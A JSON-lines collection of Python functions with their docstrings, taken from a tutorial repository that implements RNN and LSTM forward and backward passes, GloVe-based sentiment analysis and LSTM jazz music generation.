{"docstring": "\"\"\"\nArguments:\nxt -- your input data at timestep \"t\", numpy array of shape (n_x, m).\na_prev -- Hidden state at timestep \"t-1\", numpy array of shape (n_a, m)\nparameters -- python dictionary containing:\n                    Wax -- Weight matrix multiplying the input, numpy array of shape (n_a, n_x)\n                    Waa -- Weight matrix multiplying the hidden state, numpy array of shape (n_a, n_a)\n                    Wya -- Weight matrix relating the hidden-state to the output, numpy array of shape (n_y, n_a)\n                    ba --  Bias, numpy array of shape (n_a, 1)\n                    by -- Bias relating the hidden-state to the output, numpy array of shape (n_y, 1)\nReturns:\na_next -- next hidden state, of shape (n_a, m)\nyt_pred -- prediction at timestep \"t\", numpy array of shape (n_y, m)\ncache -- tuple of values needed for the backward pass, contains (a_next, a_prev, xt, parameters)\n\"\"\"\n\n# Retrieve parameters from \"parameters\"\n", "func_signal": "def rnn_cell_forward(xt, a_prev, parameters):\n", "code": "Wax = parameters[\"Wax\"]\nWaa = parameters[\"Waa\"]\nWya = parameters[\"Wya\"]\nba = parameters[\"ba\"]\nby = parameters[\"by\"]\n\n# compute next activation state using the formula given above\na_next = np.tanh(np.matmul(Waa, a_prev) + np.matmul(Wax, xt) + ba)\n# compute output of the current cell using the formula given above\nyt_pred = softmax(np.matmul(Wya, a_next) + by)\n\n# store values you need for backward propagation in cache\ncache = (a_next, a_prev, xt, parameters)\n\nreturn a_next, yt_pred, cache", "path": "BasicRNN\\main.py", "repo_name": "omerbsezer/LSTM_RNN_Tutorials_with_Demo", "stars": 529, "license": "None", "language": "python", "size": 322}
{"docstring": "\"\"\"\nArguments:\nda -- Gradients w.r.t the hidden states, numpy-array of shape (n_a, m, T_x)\ndc -- Gradients w.r.t the memory states, numpy-array of shape (n_a, m, T_x)\ncaches -- cache storing information from the forward pass (lstm_forward)\n\nReturns:\ngradients -- python dictionary containing:\n                    dx -- Gradient of inputs, of shape (n_x, m, T_x)\n                    da0 -- Gradient w.r.t. the previous hidden state, numpy array of shape (n_a, m)\n                    dWf -- Gradient w.r.t. the weight matrix of the forget gate, numpy array of shape (n_a, n_a + n_x)\n                    dWi -- Gradient w.r.t. the weight matrix of the update gate, numpy array of shape (n_a, n_a + n_x)\n                    dWc -- Gradient w.r.t. the weight matrix of the memory gate, numpy array of shape (n_a, n_a + n_x)\n                    dWo -- Gradient w.r.t. the weight matrix of the save gate, numpy array of shape (n_a, n_a + n_x)\n                    dbf -- Gradient w.r.t. biases of the forget gate, of shape (n_a, 1)\n                    dbi -- Gradient w.r.t. biases of the update gate, of shape (n_a, 1)\n                    dbc -- Gradient w.r.t. biases of the memory gate, of shape (n_a, 1)\n                    dbo -- Gradient w.r.t. biases of the save gate, of shape (n_a, 1)\n\"\"\"\n\n# Retrieve values from the first cache (t=1) of caches.\n", "func_signal": "def lstm_backward(da, caches):\n", "code": "(caches, x) = caches\n(a1, c1, a0, c0, f1, i1, cc1, o1, x1, parameters) = caches[0]\n\n# Retrieve dimensions from da's and x1's shapes\nn_a, m, T_x = da.shape\nn_x, m = x1.shape\n\n# initialize the gradients with the right sizes\ndx = np.zeros((n_x, m, T_x))\nda0 = np.zeros((n_a, m))\nda_prevt = np.zeros(da0.shape)\ndc_prevt = np.zeros(da0.shape)\ndWf = np.zeros((n_a, n_a + n_x))\ndWi = np.zeros(dWf.shape)\ndWc = np.zeros(dWf.shape)\ndWo = np.zeros(dWf.shape)\ndbf = np.zeros((n_a, 1))\ndbi = np.zeros(dbf.shape)\ndbc = np.zeros(dbf.shape)\ndbo = np.zeros(dbf.shape)\n\n# loop back over the whole sequence\nfor t in reversed(range(T_x)):\n    # Compute all gradients using lstm_cell_backward\n    gradients = lstm_cell_backward(da[:, :, t], dc_prevt, caches[t])\n    # Store or add the gradient to the parameters' previous step's gradient\n    dx[:, :, t] = gradients[\"dxt\"]\n    dWf += gradients[\"dWf\"]\n    dWi += gradients[\"dWi\"]\n    dWc += gradients[\"dWc\"]\n    dWo += gradients[\"dWo\"]\n    dbf += gradients[\"dbf\"]\n    dbi += gradients[\"dbi\"]\n    dbc += gradients[\"dbc\"]\n    dbo += gradients[\"dbo\"]\n# Set the first activation's gradient to the backpropagated gradient da_prev.\nda0 = gradients[\"da_prev\"]\n\n# Store the gradients in a python dictionary\ngradients = {\"dx\": dx, \"da0\": da0, \"dWf\": dWf, \"dbf\": dbf, \"dWi\": dWi, \"dbi\": dbi,\n             \"dWc\": dWc, \"dbc\": dbc, \"dWo\": dWo, \"dbo\": dbo}\n\nreturn gradients", "path": "BasicLSTM\\main.py", "repo_name": "omerbsezer/LSTM_RNN_Tutorials_with_Demo", "stars": 529, "license": "None", "language": "python", "size": 322}
{"docstring": "\"\"\"\nConvert a sequence (slice of the corpus) into a matrix (numpy) of one-hot vectors corresponding \nto indices in values_indices\n\nArguments:\nsequence -- python list\n\nReturns:\nx -- numpy-array of one-hot vectors \n\"\"\"\n", "func_signal": "def sequence_to_matrix(sequence, values_indices):\n", "code": "sequence_len = len(sequence)\nx = np.zeros((1, sequence_len, len(values_indices)))\nfor t, value in enumerate(sequence):\n    if (not value in values_indices): print(value)\n    x[0, t, values_indices[value]] = 1.\nreturn x", "path": "MusicGenerationProject\\music_utils.py", "repo_name": "omerbsezer/LSTM_RNN_Tutorials_with_Demo", "stars": 529, "license": "None", "language": "python", "size": 322}
{"docstring": "\"\"\"\nHelper function to fix the first value.\n\nArguments:\nnext_value -- predicted and sampled value, index between 0 and 77\nx -- numpy-array, one-hot encoding of next_value\npredict_and_sample -- predict function\nindices_values -- a python dictionary mapping indices (0-77) into their corresponding unique value (ex: A,0.250,< m2,P-4 >)\nabstract_grammars -- list of grammars, on element can be: 'S,0.250,<m2,P-4> C,0.250,<P4,m-2> A,0.250,<P4,m-2>'\nduration -- scalar, index of the loop in the parent function\nmax_tries -- Maximum numbers of time trying to fix the value\n\nReturns:\nnext_value -- process predicted value\n\"\"\"\n\n# fix first note: must not have < > and not be a rest\n", "func_signal": "def next_value_processing(model, next_value, x, predict_and_sample, indices_values, abstract_grammars, duration, max_tries = 1000, temperature = 0.5):\n", "code": "if (duration < 0.00001):\n    tries = 0\n    while (next_value.split(',')[0] == 'R' or \n        len(next_value.split(',')) != 2):\n        # give up after 1000 tries; random from input's first notes\n        if tries >= max_tries:\n            #print('Gave up on first note generation after', max_tries, 'tries')\n            # np.random is exclusive to high\n            rand = np.random.randint(0, len(abstract_grammars))\n            next_value = abstract_grammars[rand].split(' ')[0]\n        else:\n            next_value = predict_and_sample(model, x, indices_values, temperature)\n\n        tries += 1\n        \nreturn next_value", "path": "MusicGenerationProject\\music_utils.py", "repo_name": "omerbsezer/LSTM_RNN_Tutorials_with_Demo", "stars": 529, "license": "None", "language": "python", "size": 322}
{"docstring": "\"\"\"\nFunction creating the Emojify-v2 model's graph.\n\nArguments:\ninput_shape -- shape of the input, usually (max_len,)\nword_to_vec_map -- dictionary mapping every word in a vocabulary into its 50-dimensional vector representation\nword_to_index -- dictionary mapping from words to their indices in the vocabulary (400,001 words)\n\nReturns:\nmodel -- a model instance in Keras\n\"\"\"\n# Define sentence_indices as the input of the graph, it should be of shape input_shape and dtype 'int32' (as it contains indices).\n", "func_signal": "def SentimentAnalysis(input_shape, word_to_vec_map, word_to_index):\n", "code": "sentence_indices = Input(shape=input_shape, dtype=np.int32)\n\n# Create the embedding layer pretrained with GloVe Vectors (\u22481 line)\nembedding_layer = pretrained_embedding_layer(word_to_vec_map, word_to_index)\n\n# Propagate sentence_indices through your embedding layer, you get back the embeddings\nembeddings = embedding_layer(sentence_indices)\n\n# Propagate the embeddings through an LSTM layer with 128-dimensional hidden state\n# Be careful, the returned output should be a batch of sequences.\nX = LSTM(128, return_sequences=True)(embeddings)\n# Add dropout with a probability of 0.5\nX = Dropout(0.5)(X)\n# Propagate X trough another LSTM layer with 128-dimensional hidden state\n# Be careful, the returned output should be a single hidden state, not a batch of sequences.\nX = LSTM(128)(X)\n# Add dropout with a probability of 0.5\nX = Dropout(0.5)(X)\n# Propagate X through a Dense layer with softmax activation to get back a batch of 5-dimensional vectors.\nX = Dense(5, activation='softmax')(X)\n# Add a softmax activation\nX = Activation('softmax')(X)\n\n# Create Model instance which converts sentence_indices into X.\nmodel = Model(sentence_indices, X)\n\nreturn model", "path": "SentimentAnalysisProject\\main.py", "repo_name": "omerbsezer/LSTM_RNN_Tutorials_with_Demo", "stars": 529, "license": "None", "language": "python", "size": 322}
{"docstring": "# Method: generate all scales that have the chord notes th check if note is\n# in names\n\n# Derive major or minor scales (minor if 'other') based on the quality\n# of the chord.\n", "func_signal": "def __is_scale_tone(chord, note):\n", "code": "scaleType = scale.DorianScale() # i.e. minor pentatonic\nif chord.quality == 'major':\n    scaleType = scale.MajorScale()\n# Can change later to deriveAll() for flexibility. If so then use list\n# comprehension of form [x for a in b for x in a].\nscales = scaleType.derive(chord) # use deriveAll() later for flexibility\nallPitches = list(set([pitch for pitch in scales.getPitches()]))\nallNoteNames = [i.name for i in allPitches] # octaves don't matter\n\n# Get note name. Return true if in the list of note names.\nnoteName = note.name\nreturn (noteName in allNoteNames)", "path": "MusicGenerationProject\\grammar.py", "repo_name": "omerbsezer/LSTM_RNN_Tutorials_with_Demo", "stars": 529, "license": "None", "language": "python", "size": 322}
{"docstring": "\"\"\"\nUses the trained \"LSTM_cell\" and \"densor\" from model() to generate a sequence of values.\n\nArguments:\nLSTM_cell -- the trained \"LSTM_cell\" from model(), Keras layer object\ndensor -- the trained \"densor\" from model(), Keras layer object\nn_x -- number of unique values\nn_a -- number of units in the LSTM_cell\nTy -- number of time steps to generate\n\nReturns:\ninference_model -- Keras model instance\n\"\"\"\n\n# Define the input of your model with a shape \n", "func_signal": "def inference_model(LSTM_cell, densor, n_x = 78, n_a = 64, Ty = 100):\n", "code": "x0 = Input(shape=(1, n_x))\n\n# Define s0, initial hidden state for the decoder LSTM\na0 = Input(shape=(n_a,), name='a0')\nc0 = Input(shape=(n_a,), name='c0')\na = a0\nc = c0\nx = x0\n\n   \n# Create an empty list of \"outputs\" to later store predicted values\noutputs = []\n\n# Loop over Ty and generate a value at every time step\nfor t in range(Ty):\n    \n    # Perform one step of LSTM_cell \n    a, _, c = LSTM_cell(x, initial_state=[a, c])\n    \n    # Apply Dense layer to the hidden state output of the LSTM_cell \n    out = densor(a)\n\n    # Append the prediction \"out\" to \"outputs\" \n    outputs.append(out)\n    \n    # Set the prediction \"out\" to be the next input \"x\". You will need to use RepeatVector(1). \n    x = RepeatVector(1)(out)\n    \n# Create model instance with the correct \"inputs\" and \"outputs\" \ninference_model = Model(inputs=[x0, a0, c0], outputs=outputs)\n\n\nreturn inference_model", "path": "MusicGenerationProject\\inference_code.py", "repo_name": "omerbsezer/LSTM_RNN_Tutorials_with_Demo", "stars": 529, "license": "None", "language": "python", "size": 322}
{"docstring": "\"\"\"\nArguments:\nxt -- your input data at timestep \"t\", numpy array of shape (n_x, m).\na_prev -- Hidden state at timestep \"t-1\", numpy array of shape (n_a, m)\nc_prev -- Memory state at timestep \"t-1\", numpy array of shape (n_a, m)\nparameters -- python dictionary containing:\n                    Wf -- Weight matrix of the forget gate, numpy array of shape (n_a, n_a + n_x)\n                    bf -- Bias of the forget gate, numpy array of shape (n_a, 1)\n                    Wi -- Weight matrix of the update gate, numpy array of shape (n_a, n_a + n_x)\n                    bi -- Bias of the update gate, numpy array of shape (n_a, 1)\n                    Wc -- Weight matrix of the first \"tanh\", numpy array of shape (n_a, n_a + n_x)\n                    bc --  Bias of the first \"tanh\", numpy array of shape (n_a, 1)\n                    Wo -- Weight matrix of the output gate, numpy array of shape (n_a, n_a + n_x)\n                    bo --  Bias of the output gate, numpy array of shape (n_a, 1)\n                    Wy -- Weight matrix relating the hidden-state to the output, numpy array of shape (n_y, n_a)\n                    by -- Bias relating the hidden-state to the output, numpy array of shape (n_y, 1)\n\nReturns:\na_next -- next hidden state, of shape (n_a, m)\nc_next -- next memory state, of shape (n_a, m)\nyt_pred -- prediction at timestep \"t\", numpy array of shape (n_y, m)\ncache -- tuple of values needed for the backward pass, contains (a_next, c_next, a_prev, c_prev, xt, parameters)\n\nNote: ft/it/ot stand for the forget/update/output gates, cct stands for the candidate value (c tilde),\n      c stands for the memory value\n\"\"\"\n\n# Retrieve parameters from \"parameters\"\n", "func_signal": "def lstm_cell_forward(xt, a_prev, c_prev, parameters):\n", "code": "Wf = parameters[\"Wf\"]\nbf = parameters[\"bf\"]\nWi = parameters[\"Wi\"]\nbi = parameters[\"bi\"]\nWc = parameters[\"Wc\"]\nbc = parameters[\"bc\"]\nWo = parameters[\"Wo\"]\nbo = parameters[\"bo\"]\nWy = parameters[\"Wy\"]\nby = parameters[\"by\"]\n\n# Retrieve dimensions from shapes of xt and Wy\nn_x, m = xt.shape\nn_y, n_a = Wy.shape\n\n# Concatenate a_prev and xt\nconcat = np.zeros((n_a + n_x, m))\nconcat[: n_a, :] = a_prev\nconcat[n_a:, :] = xt\n\n# Compute values for ft, it, cct, c_next, ot, a_next\nft = sigmoid(np.matmul(Wf, concat) + bf)\nit = sigmoid(np.matmul(Wi, concat) + bi)\ncct = np.tanh(np.matmul(Wc, concat) + bc)\nc_next = (ft * c_prev) + (it * cct)\not = sigmoid(np.matmul(Wo, concat) + bo)\na_next = ot * np.tanh(c_next)\n\n# Compute prediction of the LSTM cell\nyt_pred = softmax(np.matmul(Wy, a_next) + by)\n\n# store values needed for backward propagation in cache\ncache = (a_next, c_next, a_prev, c_prev, ft, it, cct, ot, xt, parameters)\n\nreturn a_next, c_next, yt_pred, cache", "path": "BasicLSTM\\main.py", "repo_name": "omerbsezer/LSTM_RNN_Tutorials_with_Demo", "stars": 529, "license": "None", "language": "python", "size": 322}
{"docstring": "# Remove extraneous elements.x\n", "func_signal": "def parse_melody(fullMeasureNotes, fullMeasureChords):\n", "code": "measure = copy.deepcopy(fullMeasureNotes)\nchords = copy.deepcopy(fullMeasureChords)\nmeasure.removeByNotOfClass([note.Note, note.Rest])\nchords.removeByNotOfClass([chord.Chord])\n\n# Information for the start of the measure.\n# 1) measureStartTime: the offset for measure's start, e.g. 476.0.\n# 2) measureStartOffset: how long from the measure start to the first element.\nmeasureStartTime = measure[0].offset - (measure[0].offset % 4)\nmeasureStartOffset  = measure[0].offset - measureStartTime\n\n# Iterate over the notes and rests in measure, finding the grammar for each\n# note in the measure and adding an abstract grammatical string for it. \n\nfullGrammar = \"\"\nprevNote = None # Store previous note. Need for interval.\nnumNonRests = 0 # Number of non-rest elements. Need for updating prevNote.\nfor ix, nr in enumerate(measure):\n    # Get the last chord. If no last chord, then (assuming chords is of length\n    # >0) shift first chord in chords to the beginning of the measure.\n    try: \n        lastChord = [n for n in chords if n.offset <= nr.offset][-1]\n    except IndexError:\n        chords[0].offset = measureStartTime\n        lastChord = [n for n in chords if n.offset <= nr.offset][-1]\n\n    # FIRST, get type of note, e.g. R for Rest, C for Chord, etc.\n    # Dealing with solo notes here. If unexpected chord: still call 'C'.\n    elementType = ' '\n    # R: First, check if it's a rest. Clearly a rest --> only one possibility.\n    if isinstance(nr, note.Rest):\n        elementType = 'R'\n    # C: Next, check to see if note pitch is in the last chord.\n    elif nr.name in lastChord.pitchNames or isinstance(nr, chord.Chord):\n        elementType = 'C'\n    # L: (Complement tone) Skip this for now.\n    # S: Check if it's a scale tone.\n    elif __is_scale_tone(lastChord, nr):\n        elementType = 'S'\n    # A: Check if it's an approach tone, i.e. +-1 halfstep chord tone.\n    elif __is_approach_tone(lastChord, nr):\n        elementType = 'A'\n    # X: Otherwise, it's an arbitrary tone. Generate random note.\n    else:\n        elementType = 'X'\n\n    # SECOND, get the length for each element. e.g. 8th note = R8, but\n    # to simplify things you'll use the direct num, e.g. R,0.125\n    if (ix == (len(measure)-1)):\n        # formula for a in \"a - b\": start of measure (e.g. 476) + 4\n        diff = measureStartTime + 4.0 - nr.offset\n    else:\n        diff = measure[ix + 1].offset - nr.offset\n\n    # Combine into the note info.\n    noteInfo = \"%s,%.3f\" % (elementType, nr.quarterLength) # back to diff\n\n    # THIRD, get the deltas (max range up, max range down) based on where\n    # the previous note was, +- minor 3. Skip rests (don't affect deltas).\n    intervalInfo = \"\"\n    if isinstance(nr, note.Note):\n        numNonRests += 1\n        if numNonRests == 1:\n            prevNote = nr\n        else:\n            noteDist = interval.Interval(noteStart=prevNote, noteEnd=nr)\n            noteDistUpper = interval.add([noteDist, \"m3\"])\n            noteDistLower = interval.subtract([noteDist, \"m3\"])\n            intervalInfo = \",<%s,%s>\" % (noteDistUpper.directedName, \n                noteDistLower.directedName)\n            # print \"Upper, lower: %s, %s\" % (noteDistUpper,\n            #     noteDistLower)\n            # print \"Upper, lower dnames: %s, %s\" % (\n            #     noteDistUpper.directedName,\n            #     noteDistLower.directedName)\n            # print \"The interval: %s\" % (intervalInfo)\n            prevNote = nr\n\n    # Return. Do lazy evaluation for real-time performance.\n    grammarTerm = noteInfo + intervalInfo \n    fullGrammar += (grammarTerm + \" \")\n\nreturn fullGrammar.rstrip()", "path": "MusicGenerationProject\\grammar.py", "repo_name": "omerbsezer/LSTM_RNN_Tutorials_with_Demo", "stars": 529, "license": "None", "language": "python", "size": 322}
{"docstring": "\"\"\"\nCreates a Keras Embedding() layer and loads in pre-trained GloVe 50-dimensional vectors.\n\nArguments:\nword_to_vec_map -- dictionary mapping words to their GloVe vector representation.\nword_to_index -- dictionary mapping from words to their indices in the vocabulary (400,001 words)\n\nReturns:\nembedding_layer -- pretrained layer Keras instance\n\"\"\"\n", "func_signal": "def pretrained_embedding_layer(word_to_vec_map, word_to_index):\n", "code": "vocab_len = len(word_to_index) + 1  # adding 1 to fit Keras embedding (requirement)\nemb_dim = word_to_vec_map[\"cucumber\"].shape[0]  # define dimensionality of your GloVe word vectors (= 50)\n\n# Initialize the embedding matrix as a numpy array of zeros of shape (vocab_len, dimensions of word vectors = emb_dim)\nemb_matrix = np.zeros((vocab_len, emb_dim))\n\n# Set each row \"index\" of the embedding matrix to be the word vector representation of the \"index\"th word of the vocabulary\nfor word, index in word_to_index.items():\n    emb_matrix[index, :] = word_to_vec_map[word]\n\n# Define Keras embedding layer with the correct output/input sizes, make it trainable. Use Embedding(...). Make sure to set trainable=False.\nembedding_layer = Embedding(vocab_len, emb_dim)\n\n# Build the embedding layer, it is required before setting the weights of the embedding layer. Do not modify the \"None\".\nembedding_layer.build((None,))\n\n# Set the weights of the embedding layer to the embedding matrix. Your layer is now pretrained.\nembedding_layer.set_weights([emb_matrix])\n\nreturn embedding_layer", "path": "SentimentAnalysisProject\\main.py", "repo_name": "omerbsezer/LSTM_RNN_Tutorials_with_Demo", "stars": 529, "license": "None", "language": "python", "size": 322}
{"docstring": "\"\"\"\nArguments:\nx -- Input data for every time-step, of shape (n_x, m, T_x).\na0 -- Initial hidden state, of shape (n_a, m)\nparameters -- python dictionary containing:\n                    Wf -- Weight matrix of the forget gate, numpy array of shape (n_a, n_a + n_x)\n                    bf -- Bias of the forget gate, numpy array of shape (n_a, 1)\n                    Wi -- Weight matrix of the update gate, numpy array of shape (n_a, n_a + n_x)\n                    bi -- Bias of the update gate, numpy array of shape (n_a, 1)\n                    Wc -- Weight matrix of the first \"tanh\", numpy array of shape (n_a, n_a + n_x)\n                    bc -- Bias of the first \"tanh\", numpy array of shape (n_a, 1)\n                    Wo -- Weight matrix of the output gate, numpy array of shape (n_a, n_a + n_x)\n                    bo -- Bias of the output gate, numpy array of shape (n_a, 1)\n                    Wy -- Weight matrix relating the hidden-state to the output, numpy array of shape (n_y, n_a)\n                    by -- Bias relating the hidden-state to the output, numpy array of shape (n_y, 1)\n\nReturns:\na -- Hidden states for every time-step, numpy array of shape (n_a, m, T_x)\ny -- Predictions for every time-step, numpy array of shape (n_y, m, T_x)\ncaches -- tuple of values needed for the backward pass, contains (list of all the caches, x)\n\"\"\"\n\n# Initialize \"caches\", which will track the list of all the caches\n", "func_signal": "def lstm_forward(x, a0, parameters):\n", "code": "caches = []\n\n# Retrieve dimensions from shapes of x and parameters['Wy']\nn_x, m, T_x = x.shape\nn_y, n_a = parameters[\"Wy\"].shape\n\n# initialize \"a\", \"c\" and \"y\" with zeros\na = np.zeros((n_a, m, T_x))\nc = a\ny = np.zeros((n_y, m, T_x))\n\n# Initialize a_next and c_next\na_next = a0\nc_next = np.zeros(a_next.shape)\n\n# loop over all time-steps\nfor t in range(T_x):\n    # Update next hidden state, next memory state, compute the prediction, get the cache\n    a_next, c_next, yt, cache = lstm_cell_forward(x[:, :, t], a_next, c_next, parameters)\n    # Save the value of the new \"next\" hidden state in a\n    a[:, :, t] = a_next\n    # Save the value of the prediction in y\n    y[:, :, t] = yt\n    # Save the value of the next cell state\n    c[:, :, t] = c_next\n    # Append the cache into caches\n    caches.append(cache)\n\n# store values needed for backward propagation in cache\ncaches = (caches, x)\n\nreturn a, y, c, caches", "path": "BasicLSTM\\main.py", "repo_name": "omerbsezer/LSTM_RNN_Tutorials_with_Demo", "stars": 529, "license": "None", "language": "python", "size": 322}
{"docstring": "\"\"\"\nArguments:\nx -- Input data for every time-step, of shape (n_x, m, T_x).\na0 -- Initial hidden state, of shape (n_a, m)\nparameters -- python dictionary containing:\n                    Waa -- Weight matrix multiplying the hidden state, numpy array of shape (n_a, n_a)\n                    Wax -- Weight matrix multiplying the input, numpy array of shape (n_a, n_x)\n                    Wya -- Weight matrix relating the hidden-state to the output, numpy array of shape (n_y, n_a)\n                    ba --  Bias numpy array of shape (n_a, 1)\n                    by -- Bias relating the hidden-state to the output, numpy array of shape (n_y, 1)\n\nReturns:\na -- Hidden states for every time-step, numpy array of shape (n_a, m, T_x)\ny_pred -- Predictions for every time-step, numpy array of shape (n_y, m, T_x)\ncaches -- tuple of values needed for the backward pass, contains (list of caches, x)\n\"\"\"\n\n# Initialize \"caches\" which will contain the list of all caches\n", "func_signal": "def rnn_forward(x, a0, parameters):\n", "code": "caches = []\n\n# Retrieve dimensions from shapes of x and parameters[\"Wya\"]\nn_x, m, T_x = x.shape\nn_y, n_a = parameters[\"Wya\"].shape\n\n# initialize \"a\" and \"y\" with zeros \na = np.zeros((n_a, m, T_x))\ny_pred = np.zeros((n_y, m, T_x))\n\n# Initialize a_next (\u22481 line)\na_next = a0\n\n# loop over all time-steps\nfor t in range(T_x):\n    # Update next hidden state, compute the prediction, get the cache\n    a_next, yt_pred, cache = rnn_cell_forward(x[:, :, t], a_next, parameters)\n    # Save the value of the new \"next\" hidden state in a \n    a[:, :, t] = a_next\n    # Save the value of the prediction in y \n    y_pred[:, :, t] = yt_pred\n    # Append \"cache\" to \"caches\" \n    caches.append(cache)\n\n# store values needed for backward propagation in cache\ncaches = (caches, x)\n\nreturn a, y_pred, caches", "path": "BasicRNN\\main.py", "repo_name": "omerbsezer/LSTM_RNN_Tutorials_with_Demo", "stars": 529, "license": "None", "language": "python", "size": 322}
{"docstring": "\"\"\"\nInitializes v and s as two python dictionaries with:\n            - keys: \"dW1\", \"db1\", ..., \"dWL\", \"dbL\" \n            - values: numpy arrays of zeros of the same shape as the corresponding gradients/parameters.\n\nArguments:\nparameters -- python dictionary containing your parameters.\n                parameters[\"W\" + str(l)] = Wl\n                parameters[\"b\" + str(l)] = bl\n\nReturns: \nv -- python dictionary that will contain the exponentially weighted average of the gradient.\n                v[\"dW\" + str(l)] = ...\n                v[\"db\" + str(l)] = ...\ns -- python dictionary that will contain the exponentially weighted average of the squared gradient.\n                s[\"dW\" + str(l)] = ...\n                s[\"db\" + str(l)] = ...\n\n\"\"\"\n\n", "func_signal": "def initialize_adam(parameters) :\n", "code": "L = len(parameters) // 2 # number of layers in the neural networks\nv = {}\ns = {}\n\n# Initialize v, s. Input: \"parameters\". Outputs: \"v, s\".\nfor l in range(L):\n    v[\"dW\" + str(l+1)] = np.zeros(parameters[\"W\" + str(l+1)].shape)\n    v[\"db\" + str(l+1)] = np.zeros(parameters[\"b\" + str(l+1)].shape)\n    s[\"dW\" + str(l+1)] = np.zeros(parameters[\"W\" + str(l+1)].shape)\n    s[\"db\" + str(l+1)] = np.zeros(parameters[\"b\" + str(l+1)].shape)\n\nreturn v, s", "path": "BasicLSTM\\rnn_utils.py", "repo_name": "omerbsezer/LSTM_RNN_Tutorials_with_Demo", "stars": 529, "license": "None", "language": "python", "size": 322}
{"docstring": "# Method: see if note is +/- 1 a chord tone.\n\n", "func_signal": "def __is_approach_tone(chord, note):\n", "code": "for chordPitch in chord.pitches:\n    stepUp = chordPitch.transpose(1)\n    stepDown = chordPitch.transpose(-1)\n    if (note.name == stepDown.name or \n        note.name == stepDown.getEnharmonic().name or\n        note.name == stepUp.name or\n        note.name == stepUp.getEnharmonic().name):\n            return True\nreturn False", "path": "MusicGenerationProject\\grammar.py", "repo_name": "omerbsezer/LSTM_RNN_Tutorials_with_Demo", "stars": 529, "license": "None", "language": "python", "size": 322}
{"docstring": "\"\"\"\nArguments:\nda_next -- Gradient of loss with respect to next hidden state\ncache -- python dictionary containing useful values (output of rnn_cell_forward())\n\nReturns:\ngradients -- python dictionary containing:\n                    dx -- Gradients of input data, of shape (n_x, m)\n                    da_prev -- Gradients of previous hidden state, of shape (n_a, m)\n                    dWax -- Gradients of input-to-hidden weights, of shape (n_a, n_x)\n                    dWaa -- Gradients of hidden-to-hidden weights, of shape (n_a, n_a)\n                    dba -- Gradients of bias vector, of shape (n_a, 1)\n\"\"\"\n\n# Retrieve values from cache\n", "func_signal": "def rnn_cell_backward(da_next, cache):\n", "code": "(a_next, a_prev, xt, parameters) = cache\n\n# Retrieve values from parameters\nWax = parameters[\"Wax\"]\nWaa = parameters[\"Waa\"]\nWya = parameters[\"Wya\"]\nba = parameters[\"ba\"]\nby = parameters[\"by\"]\n\n# compute the gradient of tanh with respect to a_next \ndtanh = (1 - a_next ** 2) * da_next\n\n# compute the gradient of the loss with respect to Wax \ndxt = np.dot(Wax.T, dtanh)\ndWax = np.dot(dtanh, xt.T)\n\n# compute the gradient with respect to Waa \nda_prev = np.dot(Waa.T, dtanh)\ndWaa = np.dot(dtanh, a_prev.T)\n\n# compute the gradient with respect to b \ndba = np.sum(dtanh, 1, keepdims=True)\n\n# Store the gradients in a python dictionary\ngradients = {\"dxt\": dxt, \"da_prev\": da_prev, \"dWax\": dWax, \"dWaa\": dWaa, \"dba\": dba}\n\nreturn gradients", "path": "BasicRNN\\main.py", "repo_name": "omerbsezer/LSTM_RNN_Tutorials_with_Demo", "stars": 529, "license": "None", "language": "python", "size": 322}
{"docstring": "\"\"\"\nUses the trained \"LSTM_cell\" and \"densor\" from model() to generate a sequence of values.\n\nArguments:\nLSTM_cell -- the trained \"LSTM_cell\" from model(), Keras layer object\ndensor -- the trained \"densor\" from model(), Keras layer object\nn_values -- integer, umber of unique values\nn_a -- number of units in the LSTM_cell\nTy -- integer, number of time steps to generate\n\nReturns:\ninference_model -- Keras model instance\n\"\"\"\n\n# Define the input of your model with a shape\n", "func_signal": "def music_inference_model(LSTM_cell, densor, n_values=78, n_a=64, Ty=100):\n", "code": "x0 = Input(shape=(1, n_values))\n\n# Define s0, initial hidden state for the decoder LSTM\na0 = Input(shape=(n_a,), name='a0')\nc0 = Input(shape=(n_a,), name='c0')\na = a0\nc = c0\nx = x0\n\noutputs = []\n\n# Loop over Ty and generate a value at every time step\nfor t in range(Ty):\n    # Perform one step of LSTM_cell (\u22481 line); LSTM_cell = LSTM(n_a, return_state = True)\n    a, _, c = LSTM_cell(x, initial_state=[a, c])\n\n    # Apply Dense layer to the hidden state output of the LSTM_cell; densor = Dense(n_values, activation='softmax')\n    out = densor(a)\n\n    # Append the prediction \"out\" to \"outputs\". out.shape = (None, 78)\n    outputs.append(out)\n\n    # Select the next value according to \"out\", and set \"x\" to be the one-hot representation of the\n    #           selected value, which will be passed as the input to LSTM_cell on the next step. We have provided\n    #           the line of code you need to do this.\n    x = Lambda(one_hot)(out)\n\n# Create model instance with the correct \"inputs\" and \"outputs\" \ninference_model = Model([x0, a0, c0], outputs)\n\nreturn inference_model", "path": "MusicGenerationProject\\main.py", "repo_name": "omerbsezer/LSTM_RNN_Tutorials_with_Demo", "stars": 529, "license": "None", "language": "python", "size": 322}
{"docstring": "\"\"\"\nImplement the model\nArguments:\nTx -- length of the sequence in a corpus\nn_a -- the number of activations used in our model\nn_values -- number of unique values in the music data\n\nReturns:\nmodel -- a keras model with the\n\"\"\"\n\n# Define the input of your model with a shape\n", "func_signal": "def djmodel(Tx, n_a, n_values):\n", "code": "X = Input(shape=(Tx, n_values))\n\n# Define s0, initial hidden state for the decoder LSTM\na0 = Input(shape=(n_a,), name='a0')\nc0 = Input(shape=(n_a,), name='c0')\na = a0\nc = c0\noutputs = []\n\nfor t in range(Tx):\n    # select the \"t\"th time step vector from X.\n    x = Lambda(lambda x: X[:, t, :])(X)\n    # Use reshapor to reshape x to be (1, n_values) (\u22481 line); reshapor = Reshape((1, 78))\n    x = reshapor(x)\n    # Perform one step of the LSTM_cell; LSTM_cell = LSTM(n_a, return_state = True)\n    a, _, c = LSTM_cell(x, initial_state=[a, c])\n    # Apply densor to the hidden state output of LSTM_Cell; densor = Dense(n_values, activation='softmax')\n    out = densor(a)\n    # add the output to \"outputs\"\n    outputs.append(out)\n\n# Create model instance\nmodel = Model([X, a0, c0], outputs)\nreturn model", "path": "MusicGenerationProject\\main.py", "repo_name": "omerbsezer/LSTM_RNN_Tutorials_with_Demo", "stars": 529, "license": "None", "language": "python", "size": 322}
